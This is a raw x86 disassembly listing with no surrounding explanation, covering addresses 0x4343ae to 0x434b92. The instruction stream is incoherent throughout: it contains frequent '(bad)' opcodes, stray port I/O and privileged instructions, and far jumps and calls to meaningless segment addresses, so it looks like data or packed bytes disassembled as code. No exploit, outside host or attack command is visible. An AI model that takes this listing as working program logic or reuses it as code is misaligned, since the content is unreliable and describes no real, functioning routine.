  4343ae:	xor    ebx,DWORD PTR ds:0xd6db8acc
  4343b4:	inc    esp
  4343b5:	add    DWORD PTR [edx+0x60],ecx
  4343b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4343b9:	sti    
  4343ba:	mov    WORD PTR [ebp+0x5d],ds
  4343bd:	call   0x6614b1cc
  4343c2:	mov    edi,0x35945b80
  4343c7:	scas   al,BYTE PTR es:[edi]
  4343c8:	add    eax,0x67105d0b
  4343cd:	push   edi
  4343ce:	scas   eax,DWORD PTR es:[edi]
  4343cf:	in     eax,dx
  4343d0:	(bad)  
  4343d1:	inc    esp
  4343d2:	jno    0x43443f
  4343d4:	xchg   ebp,eax
  4343d5:	(bad)
  4343d9:	daa    
  4343da:	mov    ecx,0xe8a06a21
  4343df:	rcr    DWORD PTR [ecx],1
  4343e1:	mov    esp,0xd4110d82
  4343e6:	aam    0x42
  4343e8:	jo     0x434417
  4343ea:	lock push edi
  4343ec:	mov    ch,0x3
  4343ee:	stos   BYTE PTR es:[edi],al
  4343ef:	pop    ebp
  4343f0:	or     esi,esi
  4343f2:	in     al,0x40
  4343f4:	mov    al,ds:0xa9b04b6
  4343f9:	jle    0x434403
  4343fb:	fimul  WORD PTR [edi]
  4343fd:	mov    dh,0x82
  4343ff:	or     bh,BYTE PTR [ebx-0x46be27f8]
  434405:	push   ebp
  434406:	and    eax,0xb1686376
  43440b:	push   esp
  43440c:	push   ebx
  43440d:	adc    eax,0x3dc676c4
  434412:	imul   edi,DWORD PTR [ebx],0xffffffaa
  434415:	mov    eax,0x985fa3ff
  43441a:	test   eax,0x7511a41a
  43441f:	add    al,0xb7
  434421:	ins    DWORD PTR es:[edi],dx
  434422:	push   esi
  434423:	mov    eax,ds:0xb5894a4b
  434428:	dec    edi
  434429:	nop
  43442a:	push   0xffffff8a
  43442c:	mov    edx,0x3aea32b0
  434431:	push   0x156f2e70
  434436:	mov    al,ds:0xf9bf5b6d
  43443b:	clc    
  43443c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43443d:	xlat   BYTE PTR ds:[ebx]
  43443e:	outs   dx,BYTE PTR ds:[esi]
  43443f:	cmp    esi,DWORD PTR [esi+0x55]
  434442:	mov    ah,0x15
  434444:	pop    eax
  434445:	xchg   esp,eax
  434446:	jo     0x434474
  434448:	loop   0x43441a
  43444a:	adc    eax,0x1a5aa21b
  43444f:	or     eax,0xb1ba7212
  434454:	push   eax
  434455:	mov    eax,0x79302edf
  43445a:	jbe    0x43446e
  43445c:	mul    BYTE PTR [edx-0x2492245a]
  434462:	clc    
  434463:	call   0x4db6:0xe00cde5d
  43446a:	rol    ecx,0xa7
  43446d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43446e:	and    BYTE PTR [edx+0x13],0x10
  434472:	or     ebp,esi
  434474:	sub    eax,0x6b6db768
  434479:	dec    ebx
  43447a:	shr    BYTE PTR [eax+0x30],cl
  43447d:	mov    ecx,0x4534f2a3
  434482:	xor    dl,dh
  434484:	mov    dh,0xd4
  434486:	test   al,0x38
  434488:	cmp    esi,DWORD PTR [ecx+0x752bd76b]
  43448e:	add    DWORD PTR [ecx-0x39],edx
  434491:	(bad)  
  434492:	repz push ds
  434494:	stc    
  434495:	pop    eax
  434496:	jmp    0xae3b:0xb0b942c6
  43449d:	push   ss
  43449e:	xchg   esp,eax
  43449f:	shl    ah,cl
  4344a1:	cmp    BYTE PTR [eax],dl
  4344a3:	sub    eax,0x9e929b5b
  4344a8:	add    ah,dl
  4344aa:	(bad)  
  4344ab:	imul   edx,DWORD PTR ds:0x4cdb5b6c,0x4f
  4344b2:	mov    al,0x9b
  4344b4:	cwde   
  4344b5:	lds    ebp,FWORD PTR ds:[esi+ecx*4-0x1792af26]
  4344bd:	jnp    0x4344e8
  4344bf:	nop
  4344c0:	cmc    
  4344c1:	int3   
  4344c2:	sub    DWORD PTR [eax],0x6e
  4344c5:	xchg   BYTE PTR [edi],dl
  4344c7:	fist   WORD PTR [edx+0x4cb57f5c]
  4344cd:	jne    0x4344e4
  4344cf:	mov    ch,0x61
  4344d1:	ins    DWORD PTR es:[edi],dx
  4344d2:	mov    ds:0x6ed06ceb,al
  4344d7:	xchg   esp,eax
  4344d8:	sub    ch,dh
  4344da:	shl    dl,0xd5
  4344dd:	pop    esp
  4344de:	mov    eax,0xf9320a55
  4344e3:	fwait
  4344e4:	or     eax,0x696d42ff
  4344e9:	test   eax,0x3ef1eca3
  4344ee:	ins    DWORD PTR es:[edi],dx
  4344ef:	cmp    esi,DWORD PTR [edi]
  4344f1:	cmc    
  4344f2:	mov    dl,BYTE PTR [esi+0x2b3f8582]
  4344f8:	dec    edx
  4344f9:	(bad)  [esi+0x2eb70157]
  4344ff:	into   
  434500:	cwde   
  434501:	mov    al,0xe8
  434503:	test   BYTE PTR [edx+0x3d],0x8
  434507:	mov    edx,0x9e42840
  43450c:	mov    ss,edi
  43450e:	pop    ecx
  43450f:	mov    eax,0x75b3b1b0
  434514:	sub    eax,0xa6e97c5f
  434519:	sub    ecx,DWORD PTR [esp+eax*8-0x5a]
  43451d:	mov    bl,BYTE PTR [ebx+0x56]
  434520:	sahf   
  434521:	outs   dx,DWORD PTR ds:[esi]
  434522:	mul    DWORD PTR [esi*1+0x76d82286]
  434529:	repnz and ah,ah
  43452c:	mov    eax,ds:0xda2a654d
  434531:	push   eax
  434532:	aad    0x25
  434534:	jge    0x4344ce
  434536:	xchg   edx,eax
  434537:	inc    ebx
  434538:	shr    BYTE PTR [ebp+0x6b],0xbb
  43453c:	adc    BYTE PTR [ebp+edi*4-0xdc1cdb0],dl
  434543:	outs   dx,DWORD PTR ds:[esi]
  434544:	sub    ebp,eax
  434546:	mov    dh,0x75
  434548:	adc    bh,al
  43454a:	push   esp
  43454b:	push   0xdb879e8a
  434550:	push   esp
  434551:	mov    bh,0x46
  434553:	jp     0x434511
  434555:	adc    bl,dl
  434557:	mov    dh,0x2c
  434559:	push   es
  43455a:	sub    al,0xa6
  43455c:	mov    al,ds:0x8a6456cb
  434561:	out    0x99,al
  434563:	repnz and dh,BYTE PTR [esi]
  434566:	add    eax,0xf4d87fc0
  43456b:	in     al,0xf5
  43456d:	push   0xcc26c057
  434572:	(bad)  
  434573:	pusha  
  434574:	push   ecx
  434575:	scas   eax,DWORD PTR es:[edi]
  434576:	inc    ebx
  434577:	jbe    0x43458a
  434579:	in     al,dx
  43457a:	mov    al,ds:0xb9d1f57c
  43457f:	mov    dh,0x53
  434581:	shl    DWORD PTR [esi-0x45c727d8],0xbb
  434588:	bound  ebx,QWORD PTR [ecx]
  43458a:	lea    ebp,[esi]
  43458c:	pusha  
  43458d:	push   ebx
  43458e:	xlat   BYTE PTR ds:[ebx]
  43458f:	xor    eax,0xe79c66cf
  434594:	mov    ch,0x86
  434596:	lods   eax,DWORD PTR ds:[esi]
  434597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434598:	mov    eax,ds:0x9a91a9dd
  43459d:	pop    esi
  43459e:	icebp  
  43459f:	add    eax,0x2a5040d1
  4345a4:	pop    esp
  4345a5:	call   0x5bf8ba81
  4345aa:	mov    ebx,0xa015a5b5
  4345af:	lahf   
  4345b0:	push   0xde292dd
  4345b5:	push   esi
  4345b6:	adc    al,0xd4
  4345b8:	mov    dh,0x4
  4345ba:	adc    al,al
  4345bc:	sbb    cl,BYTE PTR [ebx]
  4345be:	in     al,dx
  4345bf:	and    dl,0xd6
  4345c2:	aad    0xe1
  4345c4:	or     esi,DWORD PTR gs:[ebp-0x6a]
  4345c8:	push   cs
  4345c9:	icebp  
  4345ca:	xchg   esi,eax
  4345cb:	outs   dx,BYTE PTR ds:[esi]
  4345cc:	je     0x4345e2
  4345ce:	xor    BYTE PTR [edi+0x0],bh
  4345d1:	(bad)  [ebx-0x24be28e9]
  4345d7:	mov    cs,WORD PTR [edx+0xbf09d54]
  4345dd:	adc    DWORD PTR [esi-0x4b2912b],esi
  4345e3:	loopne 0x4345b3
  4345e5:	and    eax,0x6d195c54
  4345ea:	xchg   ebp,eax
  4345eb:	fcomp  QWORD PTR [ebx+ecx*1-0x25]
  4345ef:	cmp    eax,0xc8857123
  4345f4:	call   0x352f:0xf92dd220
  4345fb:	adc    BYTE PTR [eax],ah
  4345fd:	sahf   
  4345fe:	fdivr  DWORD PTR ds:[ebx]
  434601:	add    cl,dl
  434603:	pushf  
  434604:	add    BYTE PTR [eax-0x127a77a0],bh
  43460a:	inc    esi
  43460b:	adc    bh,BYTE PTR [edi]
  43460d:	outs   dx,BYTE PTR ds:[esi]
  43460e:	stos   BYTE PTR es:[edi],al
  43460f:	sbb    BYTE PTR [edi-0x75],bh
  434612:	adc    esi,DWORD PTR [ebp+0x2bc183b0]
  434618:	adc    eax,0x7510699a
  43461d:	adc    eax,0x99ff512c
  434622:	adc    al,BYTE PTR [edx-0x5c81a73b]
  434628:	push   esp
  434629:	arpl   cx,cx
  43462b:	lods   eax,DWORD PTR ds:[esi]
  43462c:	jl     0x43462e
  43462e:	mov    ebp,0x50d8b5fe
  434633:	mov    al,0x29
  434635:	jb     0x434686
  434637:	and    al,BYTE PTR [eax+0x6b]
  43463a:	xor    al,0x5
  43463c:	pop    ebp
  43463d:	jmp    0xbfc9:0x2fca50a
  434644:	lods   eax,DWORD PTR ds:[esi]
  434645:	xchg   DWORD PTR [esi+0x5d],ebp
  434648:	imul   esp,DWORD PTR [edx],0x4a
  43464b:	adc    eax,0x673626c5
  434650:	dec    esp
  434651:	xor    al,0x5
  434653:	lds    eax,FWORD PTR [edx+0x49]
  434656:	pop    ds
  434657:	es jae 0x434635
  43465a:	(bad)  
  43465b:	ret    0xbd05
  43465e:	clc    
  43465f:	das    
  434660:	les    eax,FWORD PTR [edi+0x25]
  434663:	adc    eax,DWORD PTR [edx]
  434665:	out    0xb6,al
  434667:	or     ecx,DWORD PTR [ebx+0xf]
  43466a:	push   edx
  43466b:	lods   al,BYTE PTR ds:[esi]
  43466c:	and    edx,DWORD PTR [edx]
  43466e:	mov    dl,0x55
  434670:	and    DWORD PTR [esi+ebx*2+0x146db445],0x55
  434678:	xor    edx,DWORD PTR [eax-0x26]
  43467b:	pop    ecx
  43467c:	fiadd  DWORD PTR [ecx-0x3f]
  43467f:	lods   eax,DWORD PTR ds:[esi]
  434680:	repz mov WORD PTR [ecx-0x16],fs
  434684:	jecxz  0x434665
  434686:	adc    al,0xd
  434688:	adc    DWORD PTR [ebx],ebx
  43468a:	mov    dh,BYTE PTR [ebx]
  43468c:	cmp    ebx,DWORD PTR [ebx-0x2d2f9bd4]
  434692:	mov    cs,WORD PTR [edx+0xea4a497]
  434698:	push   ebx
  434699:	and    al,0xb6
  43469b:	or     ebx,DWORD PTR [ebx+0x17]
  43469e:	mov    esp,0x1c415359
  4346a3:	mov    esi,0xc67868ad
  4346a8:	mov    dh,0x1
  4346aa:	or     BYTE PTR [edi-0x214fae99],cl
  4346b0:	arpl   bx,bx
  4346b2:	inc    edx
  4346b3:	pop    es
  4346b4:	(bad)  
  4346b5:	jmp    0x8cb3656a
  4346ba:	mov    eax,ds:0xd4b8596f
  4346bf:	outs   dx,BYTE PTR ds:[esi]
  4346c0:	xchg   dh,ah
  4346c2:	mov    bl,0xfe
  4346c4:	push   eax
  4346c5:	stos   DWORD PTR es:[edi],eax
  4346c6:	popaw  
  4346c8:	shl    DWORD PTR [ebp+0x286db5b0],0x86
  4346cf:	add    eax,0xdff72ff5
  4346d4:	shr    BYTE PTR [ecx-0x249175f],1
  4346da:	fwait
  4346db:	xlat   BYTE PTR ds:[ebx]
  4346dc:	dec    ebx
  4346dd:	xor    dl,cl
  4346df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4346e0:	ds ins DWORD PTR es:[edi],dx
  4346e2:	pop    ebp
  4346e3:	inc    esp
  4346e4:	jno    0x4346d7
  4346e6:	xor    BYTE PTR [ecx],ch
  4346e8:	test   al,0x8f
  4346ea:	test   BYTE PTR [edx-0x734b47ac],bh
  4346f0:	xor    cl,bl
  4346f2:	push   cs
  4346f3:	repz pop ds
  4346f5:	(bad)  
  4346f6:	xor    DWORD PTR [edi],esi
  4346f8:	sub    DWORD PTR [eax-0x69d6a4a5],0x65
  4346ff:	or     ebp,DWORD PTR [ebp+0x1f]
  434702:	repz fwait
  434704:	adc    BYTE PTR [esi-0x797f9260],0x86
  43470b:	adc    bh,BYTE PTR [esi+esi*2+0x5068585b]
  434712:	jl     0x43478a
  434714:	sub    eax,DWORD PTR [ecx]
  434716:	ja     0x434784
  434718:	fldcw  WORD PTR [ecx]
  43471a:	(bad)  
  43471b:	jbe    0x434772
  43471d:	rcr    BYTE PTR [ecx-0x252cba19],0x8
  434724:	fcmovnb st,st(2)
  434726:	mov    dl,0x51
  434729:	dec    esp
  43472a:	cmp    dh,al
  43472c:	or     eax,0x7023094f
  434731:	mov    cs:0xa2086c6e,al
  434737:	(bad)  
  434738:	iret   
  434739:	or     ch,0x58
  43473c:	ficomp DWORD PTR [edx]
  43473e:	fist   DWORD PTR [eax-0x60]
  434741:	imul   edi,DWORD PTR [edi],0x3
  434744:	retf   
  434745:	mov    edi,0x14d73d1
  43474a:	je     0x4347a7
  43474c:	cli    
  43474d:	pushf  
  43474e:	mov    edi,0xa84471f6
  434753:	sub    eax,0xa8203aa
  434758:	mov    ch,0xce
  43475a:	cmp    al,0x4d
  43475c:	add    DWORD PTR [ebx+0x54],ecx
  43475f:	imul   edi,DWORD PTR [esi],0xa21afb8e
  434765:	test   DWORD PTR [ebx+0x3e],ecx
  434768:	ss (bad) 
  43476a:	dec    edi
  43476b:	in     eax,0x2b
  43476d:	adc    BYTE PTR ds:0x3bdc405c,0x98
  434774:	sub    ah,BYTE PTR [edi-0x23]
  434777:	mov    al,0x5
  434779:	je     0x43478b
  43477b:	enter  0xde4f,0xc7
  43477f:	es loop 0x434758
  434782:	inc    esp
  434783:	add    esi,ebp
  434785:	adc    ebp,ebp
  434787:	js     0x43471e
  434789:	(bad)  
  43478a:	inc    esp
  43478b:	rol    DWORD PTR [ebp+0x5cb85268],0xc4
  434792:	lds    ecx,FWORD PTR [ebx]
  434794:	pop    edx
  434795:	inc    ebp
  434796:	in     eax,dx
  434797:	rcr    BYTE PTR [eax],cl
  434799:	jno    0x4347e3
  43479b:	stos   BYTE PTR es:[edi],al
  43479c:	add    eax,0x258aa253
  4347a1:	fcmovu st,st(2)
  4347a3:	sbb    eax,0x17a339
  4347a8:	pop    esi
  4347a9:	in     al,dx
  4347aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4347ab:	xchg   edx,eax
  4347ac:	push   0xffffffcf
  4347ae:	jo     0x4347dc
  4347b0:	and    edx,DWORD PTR [ebp-0x13]
  4347b3:	jo     0x434805
  4347b5:	mov    ecx,0xadeaae69
  4347ba:	mov    al,0x6d
  4347bc:	sbb    eax,0x33b07916
  4347c1:	enter  0xcabb,0xd
  4347c5:	frstor [eax]
  4347c7:	pop    esp
  4347c8:	adc    eax,0x9bf37bdb
  4347cd:	mov    BYTE PTR [ebp+0x40],bl
  4347d0:	mov    al,0x23
  4347d2:	dec    ecx
  4347d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4347d4:	rol    dh,0xa5
  4347d7:	fidiv  DWORD PTR [esi+0x2eabb381]
  4347dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4347de:	loope  0x43476f
  4347e0:	int3   
  4347e1:	lea    ebx,ds:0x95ccb01
  4347e7:	daa    
  4347e8:	push   eax
  4347e9:	inc    eax
  4347ea:	cmp    DWORD PTR [edi+0x6eaaaeb7],esi
  4347f0:	mov    ebx,es
  4347f2:	mov    esp,0x3efe17e3
  4347f7:	test   al,0x6e
  4347f9:	pop    ebx
  4347fa:	add    ebp,DWORD PTR [eax+0x41]
  4347fd:	sahf   
  4347fe:	aam    0xfb
  434800:	xor    BYTE PTR [eax+0x2ea0ed1b],0x14
  434807:	jg     0x434876
  434809:	dec    esi
  43480a:	lock sahf 
  43480c:	lods   al,BYTE PTR ds:[esi]
  43480d:	mov    al,0x52
  43480f:	xor    eax,0x94a1b405
  434814:	loopne 0x4347b0
  434816:	fdiv   DWORD PTR ds:[esi]
  434819:	lds    esp,FWORD PTR [ebp-0x5cd8bd1a]
  43481f:	cli    
  434820:	mov    edi,0xb6d1dfe9
  434825:	pop    ebx
  434826:	(bad)  [edi]
  434828:	xchg   BYTE PTR [ecx],dl
  43482a:	outs   dx,DWORD PTR ds:[esi]
  43482b:	hlt    
  43482c:	push   0x5cd7eb44
  434831:	fidivr DWORD PTR [esi+0x1c4981b8]
  434837:	and    DWORD PTR [esi+0x7b8f1a95],ecx
  43483d:	iret   
  43483e:	in     eax,dx
  43483f:	push   es
  434840:	sbb    eax,0x29947c01
  434845:	cmp    DWORD PTR [ebx],edi
  434847:	inc    esp
  434848:	fucomp st(0)
  43484a:	sub    BYTE PTR [esi-0x56],ch
  43484d:	inc    ebp
  43484e:	sbb    DWORD PTR [edx],ebx
  434850:	dec    ebp
  434851:	pushf  
  434852:	sbb    DWORD PTR [ecx+0x56],edx
  434855:	mov    edx,0x6cf800d4
  43485a:	retf   
  43485b:	xchg   esi,eax
  43485c:	push   eax
  43485d:	imul   edi,DWORD PTR [ebx],0x61
  434860:	fstp   TBYTE PTR [edx]
  434862:	loopne 0x4347f0
  434864:	mov    dh,0x45
  434866:	hlt    
  434867:	jmp    0xcad8e164
  43486c:	pop    ebp
  43486d:	push   eax
  43486e:	jno    0x4348d9
  434870:	shl    BYTE PTR [eax-0x6f9339d5],cl
  434876:	mov    cl,0x1
  434878:	scas   eax,DWORD PTR es:[edi]
  434879:	outs   dx,BYTE PTR ds:[esi]
  43487a:	ds add al,0xc9
  43487d:	jmp    0x2acd3c39
  434882:	inc    ebp
  434883:	mov    ebx,0x2307503
  434888:	xor    edx,esp
  43488a:	mov    ds:0xee608a6d,al
  43488f:	mov    esp,0xbb778f58
  434894:	sub    eax,0x26c3856d
  434899:	cmp    al,0xe9
  43489b:	mov    eax,ds:0x59dab344
  4348a0:	and    ebp,eax
  4348a2:	inc    esi
  4348a3:	arpl   WORD PTR [edi+0x57],bx
  4348a6:	sbb    BYTE PTR [esi],bl
  4348a8:	xchg   ebp,eax
  4348a9:	test   al,0x60
  4348ab:	adc    eax,eax
  4348ad:	lods   eax,DWORD PTR ds:[esi]
  4348ae:	lods   al,BYTE PTR ds:[esi]
  4348af:	pop    esp
  4348b0:	leave  
  4348b1:	enter  0x359,0x9d
  4348b5:	je     0x43490b
  4348b7:	fwait
  4348b8:	sub    cl,ch
  4348ba:	les    esi,FWORD PTR [ebp+0x2ec5dd5b]
  4348c0:	mov    al,ds:0x3d11876e
  4348c5:	cld    
  4348c6:	jmp    0x607:0x68abea07
  4348cd:	jbe    0x434949
  4348cf:	inc    esp
  4348d0:	inc    edi
  4348d1:	and    BYTE PTR [esi+0x75],ch
  4348d4:	cmc    
  4348d5:	or     edx,DWORD PTR [ecx+esi*1]
  4348d8:	mov    DWORD PTR [eax+0xe],0x21dbb628
  4348df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4348e0:	fcmovnbe st,st(1)
  4348e3:	pop    edi
  4348e4:	fdiv   QWORD PTR [esi]
  4348e6:	add    al,0xb0
  4348e8:	add    ebx,eax
  4348ea:	jae    0x434899
  4348ec:	das    
  4348ed:	les    edi,FWORD PTR [ecx-0x49d59498]
  4348f3:	call   0xdb4c:0xf22ec188
  4348fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4348fb:	bound  ecx,QWORD PTR [ebx-0x12086776]
  434901:	(bad)  
  434902:	jge    0x4348c2
  434904:	sbb    eax,0x1912cb54
  434909:	mov    edi,0xaeb6eeb6
  43490e:	ins    DWORD PTR es:[edi],dx
  43490f:	sub    BYTE PTR [eax-0x5a919666],cl
  434915:	clc    
  434916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434917:	lods   eax,DWORD PTR ds:[esi]
  434918:	and    DWORD PTR [edx],ecx
  43491a:	outs   dx,BYTE PTR ds:[esi]
  43491b:	dec    edx
  43491c:	repz cmp BYTE PTR [ebp+0xa],al
  434920:	pop    edi
  434921:	stos   BYTE PTR es:[edi],al
  434922:	ss inc esp
  434924:	lds    ebp,FWORD PTR [edx+0x5a]
  434927:	add    dl,BYTE PTR [eax]
  434929:	icebp  
  43492a:	je     0x43498d
  43492c:	fld    TBYTE PTR [eax-0x67]
  43492f:	xchg   edi,eax
  434930:	jne    0x4349af
  434932:	cmp    dl,bh
  434934:	xchg   ecx,eax
  434935:	inc    edx
  434936:	ret    0x2e02
  434939:	jne    0x434940
  43493b:	inc    ebx
  43493c:	arpl   WORD PTR [eax-0x4fbb21ea],ax
  434942:	fstp   QWORD PTR [edx]
  434944:	outs   dx,DWORD PTR ds:[esi]
  434945:	mov    ebp,0x23753aa7
  43494a:	xchg   esp,eax
  43494b:	fisub  DWORD PTR [esi+0x2f764da2]
  434951:	dec    edi
  434952:	mov    ebp,0x769542c5
  434957:	inc    ecx
  434958:	jno    0x434933
  43495a:	adc    BYTE PTR [ecx+0x69],0xa6
  43495e:	dec    esi
  43495f:	xchg   ebp,eax
  434960:	xchg   DWORD PTR [eax-0x40],edx
  434963:	push   cs
  434964:	and    BYTE PTR [edx+0xb81f69],ah
  43496a:	mov    ebp,0xbc96ac36
  43496f:	icebp  
  434970:	fisttp QWORD PTR [edi]
  434972:	or     ch,ch
  434974:	(bad)  
  434975:	sub    DWORD PTR [eax],ecx
  434977:	iret   
  434978:	int3   
  434979:	jle    0x4349ea
  43497b:	lods   eax,DWORD PTR gs:[esi]
  43497d:	in     eax,dx
  43497e:	sub    dh,BYTE PTR [esi+0x3cf4b912]
  434984:	sahf   
  434985:	push   0xffffffa7
  434987:	out    dx,eax
  434988:	in     eax,0xa5
  43498a:	dec    ebp
  43498b:	(bad)  
  43498c:	repnz iret 
  43498e:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434990:	dec    eax
  434991:	lds    edi,FWORD PTR [edi-0x7ff63600]
  434997:	lea    ebp,[edx+0x195c6fc7]
  43499d:	test   al,0x4b
  43499f:	dec    ebp
  4349a0:	mov    ch,0xd8
  4349a2:	aas    
  4349a3:	mov    dh,0xa3
  4349a5:	(bad)  
  4349a6:	outs   dx,DWORD PTR ds:[esi]
  4349a7:	and    BYTE PTR [edi+0x40],al
  4349aa:	pop    ss
  4349ab:	sbb    bl,BYTE PTR [ecx+0x3ae307de]
  4349b1:	xor    BYTE PTR [eax-0x55],ch
  4349b4:	add    DWORD PTR [eax-0x5e],esp
  4349b7:	xchg   edi,eax
  4349b8:	mov    ebp,DWORD PTR [edi-0x44fff35a]
  4349be:	or     dh,BYTE PTR [esi+0x584c2259]
  4349c4:	jns    0x434a1d
  4349c6:	jo     0x434949
  4349c8:	xor    BYTE PTR [ebp-0x40502366],ah
  4349ce:	test   al,0xdb
  4349d0:	push   edx
  4349d1:	popa   
  4349d2:	fild   DWORD PTR [ecx+eiz*2+0x30cb2629]
  4349d9:	pop    esi
  4349da:	or     eax,0xbada8
  4349df:	add    esp,DWORD PTR [eax]
  4349e1:	and    ecx,DWORD PTR [ebp+0x6e0aeb61]
  4349e7:	xchg   ebp,eax
  4349e8:	loopne 0x4349ee
  4349ea:	inc    ecx
  4349eb:	inc    ebx
  4349ec:	in     al,dx
  4349ed:	and    DWORD PTR [ebx+0x70540d82],ecx
  4349f3:	sbb    al,0xbe
  4349f5:	imul   ebp,DWORD PTR [eax+0x50],0xb
  4349f9:	pop    ds
  4349fa:	cmp    ecx,DWORD PTR [edx-0x7b34ce67]
  434a00:	mov    cl,0x16
  434a02:	rcl    DWORD PTR [eax],cl
  434a04:	ins    DWORD PTR es:[edi],dx
  434a05:	inc    eax
  434a06:	mov    ah,0x95
  434a08:	add    eax,0xd6daacf5
  434a0d:	push   ebp
  434a0e:	pop    es
  434a0f:	adc    DWORD PTR [edi],0xffffff92
  434a12:	pop    ebx
  434a13:	das    
  434a14:	imul   eax,DWORD PTR ds:0xdd285b70,0xffffffc5
  434a1b:	(bad)
  434a20:	clc    
  434a21:	xchg   DWORD PTR [edx-0x4bbf291e],esi
  434a27:	scas   eax,DWORD PTR es:[edi]
  434a28:	(bad)  
  434a29:	leave  
  434a2a:	mov    ds:0x5bdcd5d7,al
  434a2f:	fidiv  DWORD PTR [esi+0x20899706]
  434a35:	cwde   
  434a36:	lds    eax,FWORD PTR [eax+eiz*8+0x68664190]
  434a3d:	mov    bh,0x72
  434a3f:	cmp    DWORD PTR ds:0xe6b018a7,0x3a
  434a46:	imul   ebx,ebx,0x1a
  434a49:	mov    al,ds:0x6fc627e2
  434a4e:	into   
  434a4f:	fwait
  434a50:	fwait
  434a51:	(bad)  
  434a52:	and    dh,BYTE PTR [esi]
  434a54:	push   eax
  434a55:	jno    0x434a02
  434a57:	out    0xbb,al
  434a59:	inc    esp
  434a5a:	daa    
  434a5b:	mov    bh,0xb6
  434a5d:	fiadd  DWORD PTR [esi]
  434a5f:	or     esi,DWORD PTR [ecx+0x4a]
  434a62:	stos   BYTE PTR es:[edi],al
  434a63:	jg     0x434a29
  434a65:	jo     0x434aa7
  434a67:	mov    ds:0x685a2b6a,al
  434a6c:	jge    0x434ae1
  434a6e:	xor    al,0x55
  434a70:	push   esi
  434a71:	shl    BYTE PTR [esi-0x15],0x22
  434a75:	dec    esp
  434a76:	mov    ebp,0x6268ba7d
  434a7b:	jae    0x434a27
  434a7d:	mov    edx,0x227f3622
  434a82:	in     eax,dx
  434a83:	dec    ebp
  434a84:	jecxz  0x434af2
  434a86:	dec    ebx
  434a87:	inc    ecx
  434a88:	pop    ebx
  434a89:	fidiv  WORD PTR [edx]
  434a8b:	enter  0xc7bd,0x26
  434a8f:	es (bad) 
  434a91:	inc    ebp
  434a92:	jno    0x434abf
  434a94:	push   0x23
  434a96:	pop    edi
  434a97:	popf   
  434a98:	call   0xc741:0x5da826d0
  434a9f:	cmp    DWORD PTR [eax],eax
  434aa1:	fcmove st,st(0)
  434aa3:	std    
  434aa4:	pop    ss
  434aa5:	jne    0x434ab7
  434aa7:	lds    ebp,FWORD PTR [esi]
  434aa9:	push   ebp
  434aaa:	jns    0x434ab3
  434aac:	int    0xcf
  434aae:	ss pop edx
  434ab0:	shl    DWORD PTR [esi+0x3fbc5d5f],0x3b
  434ab7:	ret    
  434ab8:	ss or  eax,0x5d36dc45
  434abe:	(bad)  
  434abf:	ja     0x434a79
  434ac1:	xchg   ecx,eax
  434ac2:	cmp    eax,0x1a982e2e
  434ac7:	mov    al,ds:0x6b79f223
  434acc:	lods   al,BYTE PTR ds:[esi]
  434acd:	xchg   ecx,eax
  434ace:	jns    0x434a96
  434ad0:	lods   eax,DWORD PTR ds:[esi]
  434ad1:	or     DWORD PTR [eax],0x99d46ae4
  434ad7:	xchg   BYTE PTR [edi+edx*1],bh
  434ada:	ss dec edx
  434adc:	retf   
  434add:	outs   dx,DWORD PTR ds:[esi]
  434ade:	aad    0xd4
  434ae0:	adc    ecx,0xd6d807
  434ae6:	mov    dh,0xd
  434ae8:	push   eax
  434ae9:	fsub   QWORD PTR [ebp+ebp*2+0x56]
  434aed:	in     eax,dx
  434aee:	push   ebx
  434aef:	inc    ebp
  434af0:	mov    bh,0x86
  434af2:	pop    ss
  434af3:	outs   dx,DWORD PTR ds:[esi]
  434af4:	inc    ecx
  434af5:	fisttp QWORD PTR [ebx-0x566af96b]
  434afb:	pusha  
  434afc:	and    DWORD PTR [ebx-0x65551d50],esp
  434b02:	loop   0x434ada
  434b04:	pop    esi
  434b05:	(bad)  
  434b06:	push   cs
  434b07:	fwait
  434b08:	addr16 aas 
  434b0a:	rol    BYTE PTR [ecx+0x74],0xd5
  434b0e:	in     al,dx
  434b0f:	jp     0x434aa1
  434b11:	leave  
  434b12:	or     cl,BYTE PTR [eax-0x366b5e92]
  434b18:	sti    
  434b19:	sti    
  434b1a:	rcl    DWORD PTR [ecx+0x5c],1
  434b1d:	push   0x5adf4e48
  434b22:	out    0xe6,al
  434b24:	mov    BYTE PTR [edx+0x57bb5b80],ch
  434b2a:	or     bh,dl
  434b2c:	fisub  DWORD PTR [eax]
  434b2e:	stos   DWORD PTR es:[edi],eax
  434b2f:	fucomi st,st(0)
  434b31:	(bad)  
  434b32:	adc    eax,0xa6acdc6c
  434b37:	adc    al,0x1b
  434b39:	adc    DWORD PTR [ebx],ebx
  434b3b:	mov    ecx,0xa2e8dc40
  434b40:	mov    ebp,es
  434b42:	dec    esi
  434b43:	ins    BYTE PTR es:[edi],dx
  434b44:	mov    ebp,0x36800bb1
  434b49:	dec    esi
  434b4a:	in     eax,dx
  434b4b:	ds aam 0x42
  434b4e:	inc    ecx
  434b4f:	in     eax,dx
  434b50:	mov    ds:0x59d0115d,al
  434b55:	xchg   BYTE PTR [ebp+0x360ac61c],ch
  434b5b:	push   esp
  434b5c:	mov    ah,0xf8
  434b5e:	mov    eax,0x473d61c1
  434b63:	(bad)  
  434b65:	call   0x2abd:0xd8e373c5
  434b6c:	inc    ebp
  434b6d:	push   cs
  434b6e:	imul   eax,DWORD PTR [edx+0x35025b8a],0x7c
  434b75:	jl     0x434b9f
  434b77:	jmp    0xdf71f5c3
  434b7c:	push   0xe
  434b7e:	into   
  434b7f:	popf   
  434b80:	loopne 0x434b82
  434b82:	push   ecx
  434b83:	jge    0x434b2e
  434b85:	xor    al,dl
  434b87:	sub    BYTE PTR [edx],bl
  434b89:	call   0x2abf22cd
  434b8e:	push   ss
  434b8f:	sub    BYTE PTR [eax-0x27],bl
  434b92:	lock adc eax,0xc2c054fc
